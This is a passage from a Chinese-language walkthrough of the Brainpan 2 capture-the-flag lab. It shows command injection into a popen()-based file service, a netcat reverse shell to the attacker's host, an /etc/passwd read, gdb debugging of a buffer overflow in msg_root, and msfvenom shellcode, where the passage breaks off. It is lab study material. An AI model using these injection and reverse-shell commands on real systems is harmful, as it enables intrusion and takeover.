</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                          &gt;&gt; TELL ME MORE</span><br><span class="line">    FILES    HELP    VIEW       CREATE</span><br><span class="line">    USERS    MSG     SYSTEM     BYE</span><br><span class="line"></span><br><span class="line">                          &gt;&gt; FILES</span><br><span class="line">total 36</span><br><span class="line">-rwxr-xr-x 1 root   root   18424 Nov  4  2013 brainpan.exe</span><br><span class="line">-rw-r--r-- 1 root   root    1109 Nov  5  2013 brainpan.txt</span><br><span class="line">-rw-r--r-- 1 root   root     683 Nov  4  2013 notes.txt</span><br><span class="line">-rw-r--r-- 1 anansi anansi    12 Nov  5  2013 <span class="built_in">test</span>-1</span><br><span class="line">-rwxrwxrwx 1 anansi anansi    19 Nov  5  2013 <span class="built_in">test</span>-2</span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: notes.txt</span><br><span class="line">TODO LIST</span><br><span class="line">---------</span><br><span class="line">reynard: </span><br><span class="line"> - Completed manpage. Read with groff or man.</span><br><span class="line"> - Renamed to brainpan.txt instead of brainpan.7.</span><br><span class="line"> - Fixed call to <span class="built_in">read</span> manpage: popen(<span class="string">&quot;man ./brainpan.txt&quot;</span>, <span class="string">&quot;r&quot;</span>); </span><br><span class="line"></span><br><span class="line">puck:</span><br><span class="line">Easiest way to display file contents is to just use popen(). Eg:</span><br><span class="line">popen(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/bin/man ./brainpan.7&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/usr/bin/top&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">etc... </span><br><span class="line"></span><br><span class="line">anansi: </span><br><span class="line"> - Fixed a reported buffer overflow <span class="keyword">in</span> login <span class="keyword">in</span> version 1.0. </span><br><span class="line"> - Discovered buffer overflow <span class="keyword">in</span> the <span class="built_in">command</span> prompt, fixed as of version 2.0</span><br><span class="line"></span><br><span class="line">puck: look into loading a configuration file instead of hardcoding settings </span><br><span class="line"><span class="keyword">in</span> the server, version 1.8</span><br><span class="line">anansi: dropped configuration file - leave it hardcoded, version 1.9</span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: /etc/passwd</span><br><span class="line">root:x:104:106:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">root :x:0:0:root:/var/root:/bin/bash</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">Debian-exim:x:101:103::/var/spool/exim4:/bin/<span class="literal">false</span></span><br><span class="line">statd:x:102:65534::/var/lib/nfs:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">anansi:x:1000:1000:anansi,,,:/home/anansi:/bin/bash</span><br><span class="line">puck:x:1001:1001:puck,,,:/home/puck:/bin/bash</span><br><span class="line">reynard:x:1002:1002:reynard,,,:/home/reynard:/bin/bash</span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>太好了:)可以查看系统内部可以访问的任何文件。从文件列表中，发现uid是系统用户之一。尝试成功创建和读取其主目录中的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">                          &gt;&gt; CREATE</span><br><span class="line">    ENTER FILE TO CREATE: /home/anansi/lucifer11   </span><br><span class="line">    ENTER CONTENTS: content\lucifer11testcontents</span><br><span class="line">    FILE CREATED</span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: /home/anansi/lucifer11</span><br><span class="line">content\lucifer11testcontents</span><br></pre></td></tr></table></figure>

<p>这意味着可以读取用户获得许可的每个文件，并在可写目录中创建文件。检查了其他命令，但几乎所有命令尚未实现。guest用户不可用的很少。在那一刻，想起了HELP中的一句话引起了我的注意。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AUTHENTICATION</span><br><span class="line">       There is currently no proper authentication mechanism <span class="keyword">in</span> place. At this</span><br><span class="line">       time  the software is <span class="keyword">in</span> it<span class="string">&#x27;s alpha stage. The only avaiable account is</span></span><br><span class="line"><span class="string">       GUEST. The DEBUG account will alter the output of some commands -  use\u2010</span></span><br><span class="line"><span class="string">       ful for developers.</span></span><br></pre></td></tr></table></figure>

<p>提到DEBUG用户。我已从应用程序注销并再次提供“DEBUG”而不是“GUEST”帐户的连接。使用此帐户，可以运行“SYSTEM”命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.116 9999</span></span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line">[______________________ WELCOME TO BRAINPAN 2.0________________________]</span><br><span class="line">                             LOGIN AS GUEST                             </span><br><span class="line"></span><br><span class="line">                          &gt;&gt; DEBUG</span><br><span class="line">                          ACCESS GRANTED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                             *  *  *  *                                </span><br><span class="line">    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  </span><br><span class="line">    TYPE <span class="string">&quot;TELL ME MORE&quot;</span> FOR A LIST OF COMMANDS.  </span><br><span class="line">                             *  *  *  *                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                          &gt;&gt; SYSTEM</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">HOME=/home/anansi</span><br><span class="line">COLORTERM=(null)</span><br><span class="line">PWD=/opt/brainpan</span><br><span class="line">PATH=/bin:.:/usr/bin:/sbin</span><br><span class="line">SHLVL=1</span><br></pre></td></tr></table></figure>

<p>在这里停止一下，总结一下已经了解的有关目标的知识：</p>
<ul>
<li>它以单个IP：192.168.57.1​​0运行（在我的情况下）</li>
<li>它有两个开放端口9999和10000</li>
<li>在端口10000上正在运行http服务器（此处无趣）</li>
<li>该http服务器基于Python，这意味着Python已安装并且可以使用</li>
<li>在端口9999上运行某些自定义文件传输</li>
<li>应用自定义应用程序不仅可以在应用程序根目录中提供读取/写入系统中文件的功能</li>
<li>该应用程序在/opt/brainpan中</li>
<li>对DEBUG用户的访问不受限制，因此可以完全访问该应用</li>
<li>从notes.txt中知道应用程序正在使用popen（）查看文件等。</li>
</ul>
<p>可以轻松地将任何文件上传到目标，但无法执行。下一步将是在目标系统上查找远程代码执行。目标是在端口9999上运行的自定义应用程序。在这种情况下，创建程序伪代码是一个好主意。看一下：从popen手册中发现了这一点：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">The <span class="built_in">command</span> argument is a pointer to a null-terminated string containing a shell <span class="built_in">command</span> line. This <span class="built_in">command</span> is passed to /bin/sh using the -c flag; interpretation, <span class="keyword">if</span> any, is performed by the shell.</span><br></pre></td></tr></table></figure>

<p>命令参数是指向以空结束的字符串的指针，该字符串包含shell命令行。使用-c标志将该命令传递给/bin/sh；解释（如果有）由shell执行。</p>
<p>意味着可以使用popen（）执行多个命令，唯一需要的就是将命令注入其中。在popen（）中可能使用用户输入的唯一两个命令是VIEW和CREATE。从VIEW开始：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">                          &gt;&gt; VIEW  </span><br><span class="line">    ENTER FILE TO DOWNLOAD: notes.txt; <span class="built_in">echo</span> <span class="string">&quot;some unexpected text lucifer11&quot;</span>;           </span><br><span class="line">TODO LIST</span><br><span class="line">---------</span><br><span class="line">reynard: </span><br><span class="line"> - Completed manpage. Read with groff or man.</span><br><span class="line"> - Renamed to brainpan.txt instead of brainpan.7.</span><br><span class="line"> - Fixed call to <span class="built_in">read</span> manpage: popen(<span class="string">&quot;man ./brainpan.txt&quot;</span>, <span class="string">&quot;r&quot;</span>); </span><br><span class="line"></span><br><span class="line">puck:</span><br><span class="line">Easiest way to display file contents is to just use popen(). Eg:</span><br><span class="line">popen(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/bin/man ./brainpan.7&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/usr/bin/top&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">etc... </span><br><span class="line"></span><br><span class="line">anansi: </span><br><span class="line"> - Fixed a reported buffer overflow <span class="keyword">in</span> login <span class="keyword">in</span> version 1.0. </span><br><span class="line"> - Discovered buffer overflow <span class="keyword">in</span> the <span class="built_in">command</span> prompt, fixed as of version 2.0</span><br><span class="line"></span><br><span class="line">puck: look into loading a configuration file instead of hardcoding settings </span><br><span class="line"><span class="keyword">in</span> the server, version 1.8</span><br><span class="line">anansi: dropped configuration file - leave it hardcoded, version 1.9</span><br><span class="line">some unexpected text lucifer11</span><br><span class="line"></span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: notes.txt; ifconfig;</span><br><span class="line">TODO LIST</span><br><span class="line">---------</span><br><span class="line">reynard: </span><br><span class="line"> - Completed manpage. Read with groff or man.</span><br><span class="line"> - Renamed to brainpan.txt instead of brainpan.7.</span><br><span class="line"> - Fixed call to <span class="built_in">read</span> manpage: popen(<span class="string">&quot;man ./brainpan.txt&quot;</span>, <span class="string">&quot;r&quot;</span>); </span><br><span class="line"></span><br><span class="line">puck:</span><br><span class="line">Easiest way to display file contents is to just use popen(). Eg:</span><br><span class="line">popen(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/bin/man ./brainpan.7&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/usr/bin/top&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">etc... </span><br><span class="line"></span><br><span class="line">anansi: </span><br><span class="line"> - Fixed a reported buffer overflow <span class="keyword">in</span> login <span class="keyword">in</span> version 1.0. </span><br><span class="line"> - Discovered buffer overflow <span class="keyword">in</span> the <span class="built_in">command</span> prompt, fixed as of version 2.0</span><br><span class="line"></span><br><span class="line">puck: look into loading a configuration file instead of hardcoding settings </span><br><span class="line"><span class="keyword">in</span> the server, version 1.8</span><br><span class="line">anansi: dropped configuration file - leave it hardcoded, version 1.9</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 08:00:27:6d:b8:70  </span><br><span class="line">          inet addr:192.168.56.116  Bcast:192.168.56.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::a00:27ff:fe6d:b870/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:213 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:152 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:20390 (19.9 KiB)  TX bytes:19237 (18.7 KiB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br></pre></td></tr></table></figure>

<p>可以从输出看到;后面的命令已经被成功执行</p>
<p>创建远程shell程序并执行（是的，也可以使用一些Metasploit payload创建文件并运行它）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">                      &gt;&gt; VIEW</span><br><span class="line">ENTER FILE TO DOWNLOAD: fuck; nc -e /bin/bash 192.168.56.102 6666</span><br></pre></td></tr></table></figure>

<p>监听6666端口，成功的返回了shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">192.168.56.116: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.116] 53756</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br><span class="line">anansi@brainpan2:/opt/brainpan$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)</span><br><span class="line">anansi@brainpan2:/opt/brainpan$ whoami</span><br><span class="line">whoami</span><br><span class="line">anansi</span><br><span class="line">anansi@brainpan2:/opt/brainpan$</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan2:/home/reynard$ ls  </span><br><span class="line">ls</span><br><span class="line">msg_root  readme.txt  startweb.sh  web</span><br><span class="line">anansi@brainpan2:/home/reynard$ ./msg_root</span><br><span class="line">./msg_root</span><br><span class="line">usage: msg_root username message</span><br></pre></td></tr></table></figure>

<p>anansi文件夹中没什么有趣的，可以访问reynard文件夹并找到一个有趣的应用程序。已经在文件夹中启动了SimpleHTTPServer并下载这个二进制文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan2:/home/reynard$ python -m SimpleHTTPServer</span><br><span class="line">python -m SimpleHTTPServer</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] code 404, message File not found</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] <span class="string">&quot;GET /robots.txt HTTP/1.1&quot;</span> 404 -</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] code 404, message File not found</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] <span class="string">&quot;GET /favicon.ico HTTP/1.1&quot;</span> 404 -</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:04] <span class="string">&quot;GET /msg_root HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<p>使用gdb逆向一下看看，可以看到输入垃圾数据出现了段错误</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan2:/home/reynard$ gdb msg_root</span><br><span class="line">gdb msg_root</span><br><span class="line">GNU gdb (GDB) 7.4.1-debian</span><br><span class="line">Copyright (C) 2012 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">&quot;show copying&quot;</span></span><br><span class="line">and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;i486-linux-gnu&quot;</span>.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;...</span><br><span class="line">Reading symbols from /home/reynard/msg_root...done.</span><br><span class="line"></span><br><span class="line">(gdb) r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">&lt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa                      </span><br><span class="line">Starting program: /home/reynard/msg_root aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x61616161 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) BT</span><br><span class="line">BT</span><br><span class="line"><span class="comment">#0  0x61616161 in ?? ()</span></span><br><span class="line"><span class="comment">#1  0x0804872e in get_name (u=0xbffffe70 &#x27;a&#x27; &lt;repeats 108 times&gt;, </span></span><br><span class="line">    m=0xbffffedd <span class="string">&#x27;a&#x27;</span> &lt;repeats 87 <span class="built_in">times</span>&gt;) at msg_root.c:26</span><br><span class="line"><span class="comment">#2  0x0804877b in main (argc=3, argv=0xbffffd54) at msg_root.c:35</span></span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>

<p>已经在hte中检查了文件，并在其中找到了一些函数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">save_msg</span><br><span class="line">get_name</span><br><span class="line">main</span><br></pre></td></tr></table></figure>

<p>执行应用程序后，将转到：main -&gt; get_name -&gt; save_msg。从崩溃中查看回溯，注意到方法get_name内的地址0x0804872e。分解此函数将得到如下代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble get_name</span><br><span class="line">disassemble get_name</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> get_name:</span><br><span class="line">   0x080486a1 &lt;+0&gt;:     push   %ebp</span><br><span class="line">   0x080486a2 &lt;+1&gt;:     mov    %esp,%ebp</span><br><span class="line">   0x080486a4 &lt;+3&gt;:     sub    <span class="variable">$0x20</span>,%esp</span><br><span class="line">   0x080486a7 &lt;+6&gt;:     movl   <span class="variable">$0x804863c</span>,-0x4(%ebp)</span><br><span class="line">   0x080486ae &lt;+13&gt;:    mov    0x8(%ebp),%eax</span><br><span class="line">   0x080486b1 &lt;+16&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x080486b4 &lt;+19&gt;:    call   0x8048500 &lt;strlen@plt&gt;</span><br><span class="line">   0x080486b9 &lt;+24&gt;:    cmp    <span class="variable">$0x11</span>,%eax</span><br><span class="line">   0x080486bc &lt;+27&gt;:    ja     0x80486d2 &lt;get_name+49&gt;</span><br><span class="line">   0x080486be &lt;+29&gt;:    mov    0x8(%ebp),%eax</span><br><span class="line">   0x080486c1 &lt;+32&gt;:    mov    %eax,0x4(%esp)</span><br><span class="line">   0x080486c5 &lt;+36&gt;:    lea    -0x12(%ebp),%eax</span><br><span class="line">   0x080486c8 &lt;+39&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x080486cb &lt;+42&gt;:    call   0x80484b0 &lt;strcpy@plt&gt;</span><br><span class="line">   0x080486d0 &lt;+47&gt;:    jmp    0x80486ec &lt;get_name+75&gt;</span><br><span class="line">   0x080486d2 &lt;+49&gt;:    movl   <span class="variable">$0x12</span>,0x8(%esp)</span><br><span class="line">   0x080486da &lt;+57&gt;:    mov    0x8(%ebp),%eax</span><br><span class="line">   0x080486dd &lt;+60&gt;:    mov    %eax,0x4(%esp)</span><br><span class="line">   0x080486e1 &lt;+64&gt;:    lea    -0x12(%ebp),%eax</span><br><span class="line">   0x080486e4 &lt;+67&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x080486e7 &lt;+70&gt;:    call   0x8048540 &lt;strncpy@plt&gt;</span><br><span class="line">   0x080486ec &lt;+75&gt;:    movl   <span class="variable">$0x7d0</span>,(%esp)</span><br><span class="line">   0x080486f3 &lt;+82&gt;:    call   0x80484c0 &lt;malloc@plt&gt;</span><br><span class="line">   0x080486f8 &lt;+87&gt;:    mov    %eax,-0x8(%ebp)</span><br><span class="line">   0x080486fb &lt;+90&gt;:    mov    0xc(%ebp),%eax</span><br><span class="line">   0x080486fe &lt;+93&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x08048701 &lt;+96&gt;:    call   0x8048500 &lt;strlen@plt&gt;</span><br><span class="line">   0x08048706 &lt;+101&gt;:   mov    %eax,0x8(%esp)</span><br><span class="line">   0x0804870a &lt;+105&gt;:   mov    0xc(%ebp),%eax</span><br><span class="line">   0x0804870d &lt;+108&gt;:   mov    %eax,0x4(%esp)</span><br><span class="line">   0x08048711 &lt;+112&gt;:   mov    -0x8(%ebp),%eax</span><br><span class="line">   0x08048714 &lt;+115&gt;:   mov    %eax,(%esp)</span><br><span class="line">   0x08048717 &lt;+118&gt;:   call   0x8048540 &lt;strncpy@plt&gt;</span><br><span class="line">   0x0804871c &lt;+123&gt;:   mov    -0x8(%ebp),%eax</span><br><span class="line">   0x0804871f &lt;+126&gt;:   mov    %eax,0x4(%esp)</span><br><span class="line">   0x08048723 &lt;+130&gt;:   lea    -0x12(%ebp),%eax</span><br><span class="line">   0x08048726 &lt;+133&gt;:   mov    %eax,(%esp)</span><br><span class="line">==&gt;0x08048729 &lt;+136&gt;:   mov    -0x4(%ebp),%eax</span><br><span class="line">   0x0804872c &lt;+139&gt;:   call   *%eax</span><br><span class="line">   0x0804872e &lt;+141&gt;:   mov    -0x8(%ebp),%eax</span><br><span class="line">   0x08048731 &lt;+144&gt;:   mov    %eax,(%esp)</span><br><span class="line">   0x08048734 &lt;+147&gt;:   call   0x8048490 &lt;free@plt&gt;</span><br><span class="line">   0x08048739 &lt;+152&gt;:   leave  </span><br><span class="line">   0x0804873a &lt;+153&gt;:   ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>箭头指向的指令是将地址的内容在ebp之前移4个字节，然后将其移动到eax，然后跳转到该地址。</p>
<p>这是用户提供有效输入时的场景：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) b *0x08048729</span><br><span class="line">b *0x08048729</span><br><span class="line">Breakpoint 1 at 0x8048729: file msg_root.c, line 26.</span><br><span class="line">(gdb) r aaaaaaa b</span><br><span class="line">r aaaaaaa b</span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">y</span><br><span class="line"></span><br><span class="line">Starting program: /home/reynard/msg_root aaaaaaa b</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08048729 <span class="keyword">in</span> get_name (u=0xbfffff2b <span class="string">&quot;aaaaaaa&quot;</span>, </span><br><span class="line">    m=0xbfffff33 <span class="string">&quot;b&quot;</span>) at msg_root.c:26</span><br><span class="line">26      <span class="keyword">in</span> msg_root.c</span><br><span class="line">(gdb) i r ebp eax</span><br><span class="line">i r ebp eax</span><br><span class="line">ebp            0xbffffd58       0xbffffd58</span><br><span class="line">eax            0xbffffd46       -1073742522</span><br><span class="line">(gdb) x <span class="variable">$ebp</span>-4</span><br><span class="line">x <span class="variable">$ebp</span>-4</span><br><span class="line">0xbffffd54:     0x0804863c</span><br><span class="line">(gdb) x/12xw <span class="variable">$esp</span></span><br><span class="line">x/12xw <span class="variable">$esp</span></span><br><span class="line">0xbffffd38:     0xbffffd46      0x0804a008      0x00000001      0x6161fe14</span><br><span class="line">0xbffffd48:     0x61616161      0xbfff0061      0x0804a008      0x0804863c</span><br><span class="line">0xbffffd58:     0xbffffd68      0x0804877b      0xbfffff2b      0xbfffff33</span><br></pre></td></tr></table></figure>

<p>您会注意到很少有61个对应于“aaaaaaa”的数字。命令x $ ebp-4显示将被移到eax的地址0x61616161是save_msg方法开始的地方。检查ebp-8的地址0x0804a008表明这是一个复制了第二个参数的内存（在我的情况下是几个b，下面的0x62）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) x/8xw 0x0804a008</span><br><span class="line">x/8xw 0x0804a008</span><br><span class="line">0x804a008:      0x00000062      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">(gdb) s</span><br><span class="line">s</span><br><span class="line">save_msg (u=0xbffffd46 <span class="string">&quot;aaaaaaa&quot;</span>, m=0x804a008 <span class="string">&quot;b&quot;</span>) at msg_root.c:6</span><br><span class="line">6       <span class="keyword">in</span> msg_root.c</span><br><span class="line">(gdb) i r ebp eax</span><br><span class="line">i r ebp eax</span><br><span class="line">ebp            0xbffffd30       0xbffffd30</span><br><span class="line">eax            0x804863c        134514236</span><br></pre></td></tr></table></figure>

<p>可以看到eax现在指向save_msg。提供长的第一个参数可以覆盖将被复制到eax的内存，从而使应用程序崩溃，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) r a b</span><br><span class="line">r a b</span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">y</span><br><span class="line"></span><br><span class="line">Starting program: /home/reynard/msg_root a b</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08048729 <span class="keyword">in</span> get_name (u=0xbfffff31 <span class="string">&quot;a&quot;</span>, m=0xbfffff33 <span class="string">&quot;b&quot;</span>)</span><br><span class="line">    at msg_root.c:26</span><br><span class="line">26      <span class="keyword">in</span> msg_root.c</span><br><span class="line">(gdb) x/16xw <span class="variable">$esp</span></span><br><span class="line">x/16xw <span class="variable">$esp</span></span><br><span class="line">0xbffffd38:     0xbffffd46      0x0804a008      0x00000001      0x0061fe14</span><br><span class="line">0xbffffd48:     0xbffffe24      0xbffffd68      0x0804a008      0x0804863c</span><br><span class="line">0xbffffd58:     0xbffffd68      0x0804877b      0xbfffff31      0xbfffff33</span><br><span class="line">0xbffffd68:     0xbffffde8      0xb7e8ee46      0x00000003      0xbffffe14</span><br><span class="line">(gdb) i r ebp eax</span><br><span class="line">i r ebp eax</span><br><span class="line">ebp            0xbffffd58       0xbffffd58</span><br><span class="line">eax            0xbffffd46       -1073742522</span><br><span class="line">(gdb) s</span><br><span class="line">s</span><br><span class="line">save_msg (u=0xbffffd46 <span class="string">&quot;a&quot;</span>, m=0x804a008 <span class="string">&quot;b&quot;</span>) at msg_root.c:6</span><br><span class="line">6       <span class="keyword">in</span> msg_root.c</span><br><span class="line">(gdb) i r ebp eax</span><br><span class="line">i r ebp eax</span><br><span class="line">ebp            0xbffffd30       0xbffffd30</span><br><span class="line">eax            0x804863c        134514236</span><br></pre></td></tr></table></figure>

<p>有了这些知识，开始开发阶段。我的想法很简单。在第二个参数中编写shellcode时，在第一个参数中提供shellcode的地址。因此，第一个参数只能是重复了几次的0x0804a008，这给了我：</p>
<p>对于第二个参数，需要shellcode。可以在线找到一个或使用msfvenom：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan2<span class="comment"># msfvenom -p linux/x86/exec CMD=&quot;/bin/sh&quot; -b &quot;x00&quot; -f python</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">Found 11 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 70 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 70</span><br><span class="line">Payload size: 70 bytes</span><br><span class="line">Final size of python file: 357 bytes</span><br><span class="line">buf =  b<span class="string">&quot;&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xdb\xd1\xd9\x74\x24\xf4\xba\x07\xeb\x6c\xe2\x5d\x2b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc9\xb1\x0b\x83\xc5\x04\x31\x55\x16\x03\x55\x16\xe2&quot;</span></span><br><span class="line">buf += b<span 